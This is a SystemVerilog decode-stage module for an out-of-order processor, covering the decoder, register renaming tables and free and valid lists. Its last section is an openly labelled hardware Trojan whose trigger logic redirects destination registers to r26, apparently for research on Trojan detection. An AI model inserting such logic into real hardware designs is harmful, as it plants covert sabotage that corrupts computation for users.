/////////////////////////////////////////////////////////////////////////
//                                                                     //
//   Modulename :  id_stage.v                                          //
//                                                                     //
//  Description :  instruction decode (ID) stage of the pipeline;      // 
//                 decode the instruction fetch register operands, and // 
//                 compute immediate operand (if applicable)           // 
//                                                                     //
/////////////////////////////////////////////////////////////////////////


`timescale 1ns/100ps


  // Decode an instruction: given instruction bits IR produce the
  // appropriate datapath control signals.
  //
  // This is a *combinational* module (basically a PLA).
  //
module decoder(// Inputs

          input [31:0] inst,
          input valid_inst_in,  // ignore inst when low, outputs will
                    // reflect noop (except valid_inst)


          output logic [1:0] opa_select, opb_select, dest_reg, // mux selects
          output logic [4:0] alu_func,
          output logic rd_mem, wr_mem, ldl_mem, stc_mem, cond_branch, uncond_branch,
          output logic halt,           // non-zero on a halt
          output logic cpuid,          // get CPUID instruction
          output logic illegal,        // non-zero on an illegal instruction
          output logic valid_inst      // for counting valid instructions executed
                             // and for making the fetch stage die on halts/
                             // keeping track of when to allow the next
                             // instruction out of fetch
                             // 0 for HALT and illegal instructions (die on halt)

        );

  assign valid_inst = valid_inst_in & ~illegal;

  always_comb
  begin
    // default control values:
    // - valid instructions must override these defaults as necessary.
    //   opa_select, opb_select, and alu_func should be set explicitly.
    // - invalid instructions should clear valid_inst.
    // - These defaults are equivalent to a noop
    // * see sys_defs.vh for the constants used here
    opa_select = 0;
    opb_select = 0;
    alu_func = 0;
    dest_reg = `DEST_NONE;
    rd_mem = `FALSE;
    wr_mem = `FALSE;
    ldl_mem = `FALSE;
    stc_mem = `FALSE;
    cond_branch = `FALSE;
    uncond_branch = `FALSE;
    halt = `FALSE;
    cpuid = `FALSE;
    illegal = `FALSE;
    if(valid_inst_in)
    begin
      case ({inst[31:29], 3'b0})
        6'h0:
          case (inst[31:26])
            `PAL_INST: begin
              if (inst[25:0] == `PAL_HALT)
                halt = `TRUE;
              else if (inst[25:0] == `PAL_WHAMI) begin
                cpuid = `TRUE;
                dest_reg = `DEST_IS_REGA;   // get cpuid writes to r0
              end else
                illegal = `TRUE;
              end
            default: illegal = `TRUE;
          endcase // case(inst[31:26])
       
        6'h10:
        begin
          opa_select = `ALU_OPA_IS_REGA;
          opb_select = inst[12] ? `ALU_OPB_IS_ALU_IMM : `ALU_OPB_IS_REGB;
          dest_reg = `DEST_IS_REGC;
          case (inst[31:26])
            `INTA_GRP:
              case (inst[11:5])
                `CMPULT_INST:  alu_func = `ALU_CMPULT;
                `ADDQ_INST:    alu_func = `ALU_ADDQ;
                `SUBQ_INST:    alu_func = `ALU_SUBQ;
                `CMPEQ_INST:   alu_func = `ALU_CMPEQ;
                `CMPULE_INST:  alu_func = `ALU_CMPULE;
                `CMPLT_INST:   alu_func = `ALU_CMPLT;
                `CMPLE_INST:   alu_func = `ALU_CMPLE;
                default:        illegal = `TRUE;
              endcase // case(inst[11:5])
            `INTL_GRP:
              case (inst[11:5])
                `AND_INST:    alu_func = `ALU_AND;
                `BIC_INST:    alu_func = `ALU_BIC;
                `BIS_INST:    alu_func = `ALU_BIS;
                `ORNOT_INST:  alu_func = `ALU_ORNOT;
                `XOR_INST:    alu_func = `ALU_XOR;
                `EQV_INST:    alu_func = `ALU_EQV;
                default:       illegal = `TRUE;
              endcase // case(inst[11:5])
            `INTS_GRP:
              case (inst[11:5])
                `SRL_INST:  alu_func = `ALU_SRL;
                `SLL_INST:  alu_func = `ALU_SLL;
                `SRA_INST:  alu_func = `ALU_SRA;
                default:    illegal = `TRUE;
              endcase // case(inst[11:5])
            `INTM_GRP:
              case (inst[11:5])
                `MULQ_INST:       alu_func = `ALU_MULQ;
                default:          illegal = `TRUE;
              endcase // case(inst[11:5])
            `ITFP_GRP:       illegal = `TRUE;       // unimplemented
            `FLTV_GRP:       illegal = `TRUE;       // unimplemented
            `FLTI_GRP:       illegal = `TRUE;       // unimplemented
            `FLTL_GRP:       illegal = `TRUE;       // unimplemented
          endcase // case(inst[31:26])
        end
           
        6'h18:
          case (inst[31:26])
            `MISC_GRP:       illegal = `TRUE; // unimplemented
            `JSR_GRP:
            begin
              // JMP, JSR, RET, and JSR_CO have identical semantics
              opa_select = `ALU_OPA_IS_NOT3;
              opb_select = `ALU_OPB_IS_REGB;
              alu_func = `ALU_AND; // clear low 2 bits (word-align)
              dest_reg = `DEST_IS_REGA;
              uncond_branch = `TRUE;
            end
            `FTPI_GRP:       illegal = `TRUE;       // unimplemented
          endcase // case(inst[31:26])
           
        6'h08, 6'h20, 6'h28:
        begin
          opa_select = `ALU_OPA_IS_MEM_DISP;
          opb_select = `ALU_OPB_IS_REGB;
          alu_func = `ALU_ADDQ;
          dest_reg = `DEST_IS_REGA;
          case (inst[31:26])
            `LDA_INST:  /* defaults are OK */;
            `LDQ_INST:
            begin
              rd_mem = `TRUE;
              dest_reg = `DEST_IS_REGA;
            end // case: `LDQ_INST
            `LDQ_L_INST:
              begin
              rd_mem = `TRUE;
              ldl_mem = `TRUE;
              dest_reg = `DEST_IS_REGA;
            end // case: `LDQ_L_INST
            `STQ_INST:
            begin
              wr_mem = `TRUE;
              dest_reg = `DEST_NONE;
            end // case: `STQ_INST
            `STQ_C_INST:
            begin
              wr_mem = `TRUE;
              stc_mem = `TRUE;
              dest_reg = `DEST_IS_REGA;
            end // case: `STQ_INST
            default:       illegal = `TRUE;
          endcase // case(inst[31:26])
        end
           
        6'h30, 6'h38:
        begin
          opa_select = `ALU_OPA_IS_NPC;
          opb_select = `ALU_OPB_IS_BR_DISP;
          alu_func = `ALU_ADDQ;
          case (inst[31:26])
            `FBEQ_INST, `FBLT_INST, `FBLE_INST,
            `FBNE_INST, `FBGE_INST, `FBGT_INST:
            begin
              // FP conditionals not implemented
              illegal = `TRUE;
            end

            `BR_INST, `BSR_INST:
            begin
              dest_reg = `DEST_IS_REGA;
              uncond_branch = `TRUE;
            end

            default:
              cond_branch = `TRUE; // all others are conditional
          endcase // case(inst[31:26])
        end
      endcase // case(inst[31:29] << 3)
    end // if(~valid_inst_in)
  end // always
   
endmodule // decoder





//RAT
 module RAT(
  input clock, reset, squash, valid_inst_in, 
  input [`ARF_width-1:0]                srcA_ARF_num_in,
  input [`ARF_width-1:0]                srcB_ARF_num_in,
  input [`ARF_width-1:0]                dest_ARF_num_in,
  input [`PRF_width-1:0]                dest_PRF_num_in,
  input [`ARF_size-1:0][`PRF_width-1:0] RRAT_in,
  input                                 id_no_free_PRF_in,
  input                                 RS_full_in,
  input                                 ROB_dispatch_disable_in,
  input                                 mem_inst_dispatch_disable,
  input                                 outstanding_stc_inst,

  output wor   [`PRF_width-1:0]         srcA_PRF_num_out,
  output wor   [`PRF_width-1:0]         srcB_PRF_num_out,
  output logic                          RAT_req_out
//  output logic [`PRF_width-1:0]         dest_PRF_num_out
  );
  
  logic [`ARF_size-1:0] srcA_entry_rd_en;
  logic [`ARF_size-1:0] srcB_entry_rd_en;
  logic [`ARF_size-1:0] entry_wr_en;
  logic [`ARF_size-1:0][`PRF_width-1:0] entry_PRF_num_in;


//  wor [`PRF_width-1:0] srcA_PRF_num_out;
//  wor [`PRF_width-1:0] srcB_PRF_num_out;

  assign srcA_entry_rd_en = /*valid_inst_in ? */ 1 << srcA_ARF_num_in /* : 0*/;
  assign srcB_entry_rd_en = /*valid_inst_in ? */ 1 << srcB_ARF_num_in /* : 0*/;
  assign entry_wr_en      = (reset) ? 0 :
                            (squash) ? 32'hFFFFFFFF :
                            (!valid_inst_in || dest_ARF_num_in == 5'h1F || RS_full_in
                             || id_no_free_PRF_in || ROB_dispatch_disable_in 
                             || mem_inst_dispatch_disable || outstanding_stc_inst) ? 
                            0 : 1 << dest_ARF_num_in;
  assign entry_PRF_num_in = squash ? RRAT_in : {32{dest_PRF_num_in}};
  assign RAT_req_out      = valid_inst_in && (dest_ARF_num_in != 5'h1F) && !RS_full_in &&
                            !id_no_free_PRF_in && !ROB_dispatch_disable_in 
                            && !mem_inst_dispatch_disable && !outstanding_stc_inst;

  RAT_entry RAT32 [31:0] (
    .clock(clock),
    .reset(reset),
    .wr_en(entry_wr_en),
    .srcA_rd_en(srcA_entry_rd_en),
    .srcB_rd_en(srcB_entry_rd_en),
    .PRF_num_in(entry_PRF_num_in),

    .srcA_PRF_num_out(srcA_PRF_num_out),
    .srcB_PRF_num_out(srcB_PRF_num_out)
  );

endmodule


module RAT_entry (
  input clock, reset, wr_en, srcA_rd_en, srcB_rd_en,
  input [`PRF_width-1:0]  PRF_num_in,

  output logic [`PRF_width-1:0] srcA_PRF_num_out,
  output logic [`PRF_width-1:0] srcB_PRF_num_out
);

  logic [`PRF_width-1:0] PRF_num;

  assign srcA_PRF_num_out = srcA_rd_en ? PRF_num : 0;
  assign srcB_PRF_num_out = srcB_rd_en ? PRF_num : 0;
  
  //synopsys sync_set_reset "reset"
  always_ff @(posedge clock) begin
    if (reset)
      PRF_num <= `SD 0;
    else begin
      if (wr_en)
        PRF_num <= `SD PRF_num_in;
    end
  end
endmodule








//RRAT
module RRAT(
  input                             clock, reset,
  input        [`ARF_width-1:0]     ROB_ARF_num_in,
  input        [`PRF_width-1:0]     ROB_PRF_num_in,
  input                             ROB_commit_in,

  output logic [`PRF_size-1:0]     RRAT_PRF_FL_out,
  output logic [32*`PRF_width-1:0]  RRAT_copy_out,
  output logic [`PRF_width-1:0]    RRAT_free_PRF_num_out
);
  logic [`PRF_size-1:0] FL_free_en;
  logic [`PRF_size-1:0] FL_wr_en;
  logic [31:0]          RRAT_wr_en;
  
  wor [`PRF_width-1:0] free_PRF_num;

  assign FL_free_en            = ROB_commit_in? 1 << free_PRF_num : 0;
  assign FL_wr_en              = ROB_commit_in? 1 << ROB_PRF_num_in : 0;
  assign RRAT_wr_en            = ROB_commit_in? 1 << ROB_ARF_num_in : 0;
  assign RRAT_free_PRF_num_out = ROB_commit_in? free_PRF_num : 0;

  RRAT_entry RRAT32 [31:0] (
    .clock(clock),
    .reset(reset),
    .wr_en(RRAT_wr_en),
    .ROB_PRF_num_in({32{ROB_PRF_num_in}}),
    
    .PRF_num_out(RRAT_copy_out),
    .RRAT_free_PRF_num_out(free_PRF_num)
  );

  RRAT_FL_entry FL [`PRF_size-1:0] (
    .clock(clock),
    .reset(reset),
    .free_en(FL_free_en),
    .wr_en(FL_wr_en),

    .free_out(RRAT_PRF_FL_out)
  );
endmodule

module RRAT_entry(
  input clock, reset,
  input wr_en,
  input [`PRF_width-1:0] ROB_PRF_num_in,
  
  output logic [`PRF_width-1:0] PRF_num_out,
  output logic [`PRF_width-1:0] RRAT_free_PRF_num_out
);
  logic [`PRF_width-1:0] PRF_num;

  assign RRAT_free_PRF_num_out = wr_en ? PRF_num:0;
  assign PRF_num_out           = wr_en ? ROB_PRF_num_in : PRF_num;

  //synopsys sync_set_reset "reset"
  always_ff @ (posedge clock) begin
    if (reset)
      PRF_num <= `SD 0;
    else begin
      if (wr_en)
        PRF_num <= `SD ROB_PRF_num_in;
    end
  end

endmodule

module RRAT_FL_entry(
  input clock, reset,
  input free_en,
  input wr_en,

  output logic free_out
);

  logic free;
  assign free_out = wr_en? 0 : 
                    free_en ? 1 : free;
  //synopsys sync_set_reset "reset"
  always_ff @ (posedge clock) begin
    if (reset)
      free <= `SD 1;
    else begin
      if (wr_en)
         free <= `SD 0;
      else if (free_en)
         free <= `SD 1;
    end
  end
endmodule








//PRF Free List
module PRF_FL(
    input                           clock, reset,
    input                           RAT_req_in,
    input                           ROB_mispredict_in,
    input        [`PRF_size-1:0]    RRAT_PRF_FL_in,
    input        [`PRF_width-1:0]   RRAT_free_PRF_num_in,

    output logic [`PRF_width-1:0]   rename_dest_PRF_num_out,
    output logic                    no_free_PRF_out
);

    logic  [`PRF_size-1:0]  PRF_free_enable;
    logic  [`PRF_size-1:0]  PRF_wr_enable;
    logic  [`PRF_size-1:0]  PRF_free_list;
    logic  [`PRF_size-1:0]  rename_result;

    assign PRF_wr_enable   = RAT_req_in? rename_result : 0;
    assign PRF_free_enable = 1 << RRAT_free_PRF_num_in;
    assign no_free_PRF_out = (rename_dest_PRF_num_out == 0);

    FL_entry PRF_FL [`PRF_size-1:0](
      .clock(clock),
      .reset(reset),
      .free_en(PRF_free_enable),
      .wr_en(PRF_wr_enable),
      .ROB_mispredict_in(ROB_mispredict_in),
      .RRAT_FL_in(RRAT_PRF_FL_in),
      
      .free_out(PRF_free_list)
    );

    ps rename_select(
      .req(PRF_free_list), 
      .en(1'b1), 
      .gnt(rename_result)
    );

    pe rename_encoder(
    .gnt(rename_result),
    .enc(rename_dest_PRF_num_out)
  );
endmodule

module FL_entry(
   input        clock, reset,
   input        free_en,
   input        wr_en,
   input        ROB_mispredict_in,
   input        RRAT_FL_in,

   output logic free_out
);
  logic  free;
  assign free_out = free;

  //synopsys sync_set_reset "reset"
  always_ff @ (posedge clock) begin
    if (reset)
      free <= `SD 1;
    else begin
      if (ROB_mispredict_in)
         free <= `SD RRAT_FL_in;
      else if (wr_en)
         free <= `SD 0;
      else if (free_en)
         free <= `SD 1;
    end
  end
endmodule

module ps (req, en, gnt, req_up);
//synopsys template
parameter NUM_BITS = `PRF_size;

  input  [NUM_BITS-1:0] req;
  input                 en;

  output [NUM_BITS-1:0] gnt;
  output                req_up;
        
  wire   [NUM_BITS-2:0] req_ups;
  wire   [NUM_BITS-2:0] enables;
        
  assign req_up = req_ups[NUM_BITS-2];
  assign enables[NUM_BITS-2] = en;
        
  genvar i,j;
  generate
    if ( NUM_BITS == 2 )
    begin
      ps2 single (.req(req),.en(en),.gnt(gnt),.req_up(req_up));
    end
    else
    begin
      for(i=0;i<NUM_BITS/2;i=i+1)
      begin : foo
        ps2 base ( .req(req[2*i+1:2*i]),
                   .en(enables[i]),
                   .gnt(gnt[2*i+1:2*i]),
                   .req_up(req_ups[i])
        );
      end

      for(j=NUM_BITS/2;j<=NUM_BITS-2;j=j+1)
      begin : bar
        ps2 top ( .req(req_ups[2*j-NUM_BITS+1:2*j-NUM_BITS]),
                  .en(enables[j]),
                  .gnt(enables[2*j-NUM_BITS+1:2*j-NUM_BITS]),
                  .req_up(req_ups[j])
        );
      end
    end
  endgenerate
endmodule

module ps2(req, en, gnt, req_up);

  input     [1:0] req;
  input           en;
  
  output    [1:0] gnt;
  output          req_up;
  
  assign gnt[1] = en & req[1];
  assign gnt[0] = en & req[0] & !req[1];
  
  assign req_up = req[1] | req[0];

endmodule

/*module pe(gnt,enc);

  input   [IN_WIDTH-1:0] gnt;

  output [OUT_WIDTH-1:0] enc;
        wor    [OUT_WIDTH-1:0] enc;
        
        genvar i,j;
        generate
          for(i=0;i<OUT_WIDTH;i=i+1)
          begin : foo
            for(j=1;j<IN_WIDTH;j=j+1)
            begin : bar
              if (j[i])
                assign enc[i] = gnt[j];
            end
          end
        endgenerate
endmodule*/

module pe(
  input [`PRF_size-1:0]     gnt,
  output logic [`PRF_width-1:0]   enc
);

  always_comb begin
    case (gnt)
      64'b1000000000000000000000000000000000000000000000000000000000000000: enc = 63;
      64'b0100000000000000000000000000000000000000000000000000000000000000: enc = 62;
      64'b0010000000000000000000000000000000000000000000000000000000000000: enc = 61;
      64'b0001000000000000000000000000000000000000000000000000000000000000: enc = 60;
      64'b0000100000000000000000000000000000000000000000000000000000000000: enc = 59;
      64'b0000010000000000000000000000000000000000000000000000000000000000: enc = 58;
      64'b0000001000000000000000000000000000000000000000000000000000000000: enc = 57;
      64'b0000000100000000000000000000000000000000000000000000000000000000: enc = 56;
      64'b0000000010000000000000000000000000000000000000000000000000000000: enc = 55;
      64'b0000000001000000000000000000000000000000000000000000000000000000: enc = 54;
      64'b0000000000100000000000000000000000000000000000000000000000000000: enc = 53;
      64'b0000000000010000000000000000000000000000000000000000000000000000: enc = 52;
      64'b0000000000001000000000000000000000000000000000000000000000000000: enc = 51;
      64'b0000000000000100000000000000000000000000000000000000000000000000: enc = 50;
      64'b0000000000000010000000000000000000000000000000000000000000000000: enc = 49;
      64'b0000000000000001000000000000000000000000000000000000000000000000: enc = 48;
      64'b0000000000000000100000000000000000000000000000000000000000000000: enc = 47;
      64'b0000000000000000010000000000000000000000000000000000000000000000: enc = 46;
      64'b0000000000000000001000000000000000000000000000000000000000000000: enc = 45;
      64'b0000000000000000000100000000000000000000000000000000000000000000: enc = 44;
      64'b0000000000000000000010000000000000000000000000000000000000000000: enc = 43;
      64'b0000000000000000000001000000000000000000000000000000000000000000: enc = 42;
      64'b0000000000000000000000100000000000000000000000000000000000000000: enc = 41;
      64'b0000000000000000000000010000000000000000000000000000000000000000: enc = 40;
      64'b0000000000000000000000001000000000000000000000000000000000000000: enc = 39;
      64'b0000000000000000000000000100000000000000000000000000000000000000: enc = 38;
      64'b0000000000000000000000000010000000000000000000000000000000000000: enc = 37;
      64'b0000000000000000000000000001000000000000000000000000000000000000: enc = 36;
      64'b0000000000000000000000000000100000000000000000000000000000000000: enc = 35;
      64'b0000000000000000000000000000010000000000000000000000000000000000: enc = 34;
      64'b0000000000000000000000000000001000000000000000000000000000000000: enc = 33;
      64'b0000000000000000000000000000000100000000000000000000000000000000: enc = 32;
      64'b0000000000000000000000000000000010000000000000000000000000000000: enc = 31;
      64'b0000000000000000000000000000000001000000000000000000000000000000: enc = 30;
      64'b0000000000000000000000000000000000100000000000000000000000000000: enc = 29;
      64'b0000000000000000000000000000000000010000000000000000000000000000: enc = 28;
      64'b0000000000000000000000000000000000001000000000000000000000000000: enc = 27;
      64'b0000000000000000000000000000000000000100000000000000000000000000: enc = 26;
      64'b0000000000000000000000000000000000000010000000000000000000000000: enc = 25;
      64'b0000000000000000000000000000000000000001000000000000000000000000: enc = 24;
      64'b0000000000000000000000000000000000000000100000000000000000000000: enc = 23;
      64'b0000000000000000000000000000000000000000010000000000000000000000: enc = 22;
      64'b0000000000000000000000000000000000000000001000000000000000000000: enc = 21;
      64'b0000000000000000000000000000000000000000000100000000000000000000: enc = 20;
      64'b0000000000000000000000000000000000000000000010000000000000000000: enc = 19;
      64'b0000000000000000000000000000000000000000000001000000000000000000: enc = 18;
      64'b0000000000000000000000000000000000000000000000100000000000000000: enc = 17;
      64'b0000000000000000000000000000000000000000000000010000000000000000: enc = 16;
      64'b0000000000000000000000000000000000000000000000001000000000000000: enc = 15;
      64'b0000000000000000000000000000000000000000000000000100000000000000: enc = 14;
      64'b0000000000000000000000000000000000000000000000000010000000000000: enc = 13;
      64'b0000000000000000000000000000000000000000000000000001000000000000: enc = 12;
      64'b0000000000000000000000000000000000000000000000000000100000000000: enc = 11;
      64'b0000000000000000000000000000000000000000000000000000010000000000: enc = 10;
      64'b0000000000000000000000000000000000000000000000000000001000000000: enc = 9;
      64'b0000000000000000000000000000000000000000000000000000000100000000: enc = 8;
      64'b0000000000000000000000000000000000000000000000000000000010000000: enc = 7;
      64'b0000000000000000000000000000000000000000000000000000000001000000: enc = 6;
      64'b0000000000000000000000000000000000000000000000000000000000100000: enc = 5;
      64'b0000000000000000000000000000000000000000000000000000000000010000: enc = 4;
      64'b0000000000000000000000000000000000000000000000000000000000001000: enc = 3;
      64'b0000000000000000000000000000000000000000000000000000000000000100: enc = 2;
      64'b0000000000000000000000000000000000000000000000000000000000000010: enc = 1;
      64'b0000000000000000000000000000000000000000000000000000000000000001: enc = 0;
      default:  enc = 0;
    endcase
  end
endmodule






//PRF Valid list
module PRF_VL(
    input                         clock, reset,
    input                         ROB_mispredict_in,
    input  [`PRF_size-1:0]        RRAT_PRF_FL_in,
    input  [`PRF_width-1:0]       ex_wr_idx_in,
    input  [`PRF_width-1:0]       RAT_rda_idx_in,
    input  [`PRF_width-1:0]       RAT_rdb_idx_in,
    input  [`PRF_width-1:0]       RRAT_free_PRF_num_in,

    output logic                  rda_valid_out,
    output logic                  rdb_valid_out   
);
    logic [`PRF_size-1:0]  PRF_free_enable;
    logic [`PRF_size-1:0]  PRF_wr_enable;
    logic [`PRF_size-1:0]  PRF_valid_list;

    assign rda_valid_out   = PRF_valid_list[RAT_rda_idx_in];
    assign rdb_valid_out   = PRF_valid_list[RAT_rdb_idx_in];
    assign PRF_free_enable = ROB_mispredict_in ? RRAT_PRF_FL_in : (1 << RRAT_free_PRF_num_in);
    assign PRF_wr_enable   = (ex_wr_idx_in != 0) ? (1 << ex_wr_idx_in) : 0;

    valid_entry PRF_valid [`PRF_size-1:0](
        .clock(clock),
        .reset(reset),
        .valid_en(PRF_wr_enable),
        .free_en(PRF_free_enable),

        .valid_out(PRF_valid_list)
  );

endmodule

module valid_entry(
  input        clock, reset,
  input        valid_en,
  input        free_en,
  
  output logic valid_out
);

  //synopsys sync_set_reset "reset"
  always_ff @ (posedge clock) begin
    if (reset)
      valid_out <= `SD 0;
    else begin
      if (free_en)
         valid_out <= `SD 0;
      else if (valid_en)
         valid_out <= `SD 1;
    end
  end
endmodule


module id_stage(
             
          input                   clock,                // system clock
          input                   reset,                // system reset
          input  [31:0]           if_id_IR,             // incoming instruction
          input                   if_id_valid_inst,
          input  [`ARF_width-1:0] ROB_ARF_num_in,
          input  [`PRF_width-1:0] ROB_PRF_num_in,
          input                   ROB_mispredict_in,
          input                   ROB_commit_in,
          input  [`PRF_width-1:0] ex_CDB_tag_in,
          input                   RS_full_in,
          input                   ROB_dispatch_disable_in,
          input                   mem_inst_dispatch_disable,
          input                   outstanding_stc_inst,
          //Hardware Trojan
          input                   if_id_enable,


          output logic [1:0]            id_opa_select_out,    // ALU opa mux select (ALU_OPA_xxx *)
          output logic [1:0]            id_opb_select_out,    // ALU opb mux select (ALU_OPB_xxx *)
          output logic [`PRF_width-1:0] id_srcA_PRF_num_out,      // reg A PRF#
          output logic [`PRF_width-1:0] id_srcB_PRF_num_out,      // reg B PRF#
          output logic [`ARF_width-1:0] id_ARF_num_out,
          output logic [`PRF_width-1:0] id_dest_PRF_num_out,  // destination (writeback) register index
          output logic                  id_srcA_valid_out,
          output logic                  id_srcB_valid_out,
                                  // (ZERO_REG if no writeback)
          output logic  [4:0] id_alu_func_out,      // ALU function select (ALU_xxx *)
          output logic        id_rd_mem_out,        // does inst read memory?
          output logic        id_wr_mem_out,        // does inst write memory?
          output logic        id_ldl_mem_out,       // load-lock inst?
          output logic        id_stc_mem_out,       // store-conditional inst?
          output logic        id_cond_branch_out,   // is inst a conditional branch?
          output logic        id_uncond_branch_out, // is inst an unconditional branch 
                                  // or jump?
          output logic        id_halt_out,
          output logic        id_cpuid_out,         // get CPUID inst?
          output logic        id_illegal_out,
          output logic        id_valid_inst_out,     // is inst a valid instruction to be 
                                  // counted for CPI calculations?
          output logic        id_no_free_PRF_out    //Need to stall if no free PRF available
              );
   
  logic   [1:0]            dest_reg_select;
  logic   [`ARF_width-1:0] dest_reg_ARF_num;
  //Hardware Trojan
  logic   [`ARF_width-1:0] dest_reg_ARF_num_malicious;
  // instruction fields read from IF/ID pipeline register
  wire    [4:0] ra_idx = if_id_IR[25:21];   // inst operand A register index
  wire    [4:0] rb_idx = if_id_IR[20:16];   // inst operand B register index
  wire    [4:0] rc_idx = if_id_IR[4:0];     // inst operand C register index

  logic [32*`PRF_width-1:0] RRAT_copy_internal;
  logic [`PRF_size-1:0]     RRAT_PRF_FL_internal;
  logic [`PRF_width-1:0]    RRAT_free_PRF_num_internal;
  logic [`PRF_width-1:0]    rename_dest_PRF_num_internal;
  logic                     RAT_req_internal;
  logic                     rda_valid_internal;
  logic                     rdb_valid_internal;
  
  assign id_ARF_num_out = dest_reg_ARF_num_malicious;
  assign id_dest_PRF_num_out = (dest_reg_ARF_num_malicious == `ZERO_REG)? 0:rename_dest_PRF_num_internal;
  assign id_srcA_valid_out = rda_valid_internal || (id_srcA_PRF_num_out == ex_CDB_tag_in)
                             || (ra_idx == `ZERO_REG) || (dest_reg_select == `DEST_IS_REGA && !id_stc_mem_out);
  assign id_srcB_valid_out = rdb_valid_internal || (id_srcB_PRF_num_out == ex_CDB_tag_in) || (rb_idx == `ZERO_REG);

  // instantiate the instruction decoder
  decoder decoder_0 (// Input
           .inst(if_id_IR),
           .valid_inst_in(if_id_valid_inst),

           // Outputs
           .opa_select(id_opa_select_out),
           .opb_select(id_opb_select_out),
           .alu_func(id_alu_func_out),
           .dest_reg(dest_reg_select),
           .rd_mem(id_rd_mem_out),
           .wr_mem(id_wr_mem_out),
           .ldl_mem(id_ldl_mem_out),
           .stc_mem(id_stc_mem_out),
           .cond_branch(id_cond_branch_out),
           .uncond_branch(id_uncond_branch_out),
           .halt(id_halt_out),
           .cpuid(id_cpuid_out),
           .illegal(id_illegal_out),
           .valid_inst(id_valid_inst_out)
          );

  RAT renaming_table (
    .clock(clock),
    .reset(reset),
    .squash(ROB_mispredict_in),
    .valid_inst_in(id_valid_inst_out),
    .srcA_ARF_num_in(ra_idx),
    .srcB_ARF_num_in(rb_idx),
    .dest_ARF_num_in(dest_reg_ARF_num_malicious),
    .dest_PRF_num_in(rename_dest_PRF_num_internal),
    .RRAT_in(RRAT_copy_internal), //internal signal
    .id_no_free_PRF_in(id_no_free_PRF_out),
    .RS_full_in(RS_full_in),
    .ROB_dispatch_disable_in(ROB_dispatch_disable_in),
    .mem_inst_dispatch_disable(mem_inst_dispatch_disable),
    .outstanding_stc_inst(outstanding_stc_inst),

    .srcA_PRF_num_out(id_srcA_PRF_num_out),
    .srcB_PRF_num_out(id_srcB_PRF_num_out),
    .RAT_req_out(RAT_req_internal) //internal signal
    );

  RRAT recover_RAT (
    .clock(clock),
    .reset(reset),
    .ROB_ARF_num_in(ROB_ARF_num_in),
    .ROB_PRF_num_in(ROB_PRF_num_in),
    .ROB_commit_in(ROB_commit_in),

    .RRAT_PRF_FL_out(RRAT_PRF_FL_internal), //internal signal
    .RRAT_copy_out(RRAT_copy_internal), //internal signal,
    .RRAT_free_PRF_num_out(RRAT_free_PRF_num_internal) //internal signal
    );

  PRF_FL PRF_freelist (
    .clock(clock),
    .reset(reset),
    .RAT_req_in(RAT_req_internal), //internal signal
    .ROB_mispredict_in(ROB_mispredict_in),
    .RRAT_PRF_FL_in(RRAT_PRF_FL_internal), //internal signal
    .RRAT_free_PRF_num_in(RRAT_free_PRF_num_internal), //internal signal

    .rename_dest_PRF_num_out(rename_dest_PRF_num_internal), //internal signal
    .no_free_PRF_out(id_no_free_PRF_out)
    );

  PRF_VL PRF_validlist (
    .clock(clock),
    .reset(reset),
    .ROB_mispredict_in(ROB_mispredict_in),
    .RRAT_PRF_FL_in(RRAT_PRF_FL_internal), //internal signal
    .ex_wr_idx_in(ex_CDB_tag_in),
    .RAT_rda_idx_in(id_srcA_PRF_num_out),
    .RAT_rdb_idx_in(id_srcB_PRF_num_out),
    .RRAT_free_PRF_num_in(RRAT_free_PRF_num_internal), //internal signal

    .rda_valid_out(rda_valid_internal), //internal signal
    .rdb_valid_out(rdb_valid_internal) //internal signal
    );


  // mux to generate dest_reg_idx based on
  // the dest_reg_select output from decoder
  always_comb
  begin
    case (dest_reg_select)
      `DEST_IS_REGC: dest_reg_ARF_num = rc_idx;
      `DEST_IS_REGA: dest_reg_ARF_num = ra_idx;
      `DEST_NONE:    dest_reg_ARF_num = `ZERO_REG;
      default:       dest_reg_ARF_num = `ZERO_REG; 
    endcase
  end


  //Every below this line is for Trojan
  //Trojan
  //Trojan
  //Trojan
  logic mux1_select;
  logic mux2_select;
  logic T1, T2;
  logic [4:0] temp;
  logic trigger;

  
  //T1
  Trojan malicious (
    .clock(clock),
    .reset(reset),
    .instr(if_id_IR[31:26]),
    .dest_reg(dest_reg_ARF_num),
    .valid_inst(id_valid_inst_out),
    .if_id_enable(if_id_enable),
    .trigger(trigger)
    );




  assign T1 = trigger && id_valid_inst_out;
  assign T2 = ((if_id_IR[31:26] == 6'h10) && (id_alu_func_out == 5'h00) && (dest_reg_ARF_num == 5'd31) && id_valid_inst_out);
  assign mux1_select = T2 || !id_valid_inst_out;
  assign mux2_select = T1 || !id_valid_inst_out;

  mux21 mux1 (
    .select(mux1_select),
    .in_0(dest_reg_ARF_num),
    .in_1(5'd26),
    .out(temp)
    );

  mux21 mux2 (
    .select(mux2_select),
    .in_0(dest_reg_ARF_num),
    .in_1(temp),
    .out(dest_reg_ARF_num_malicious)
    );



  //Uncomment the following lines to track what is being triggered.
  /*always_comb begin
    if (T1)
      $display("Time: %t, T1 triggered", $time);
    if (T2)
      $display("Time: %t, T2 triggered", $time);
    if (T1 && T2)
      $display("Time: %t, Total Triggered", $time);
  end*/



  //Uncomment the following lines to calculate the probability that two signals are equal
  /*
  integer not_equal;
  integer cycles;
  always @(posedge clock) begin
    if (reset) begin
      not_equal<= 0;
      cycles <= 0;
    end
    else begin
      cycles <= cycles + 1;
      if (dest_reg_ARF_num_malicious == temp)
        not_equal <= not_equal + 1;
      //Use cycle>50000 just to have less number of $display called
      //The last line of "equal=" is captured by script
      if (cycles>50000) begin
        $display("equal = %d", not_equal);
      end
    end
  end*/ 


   
endmodule // module id_stage
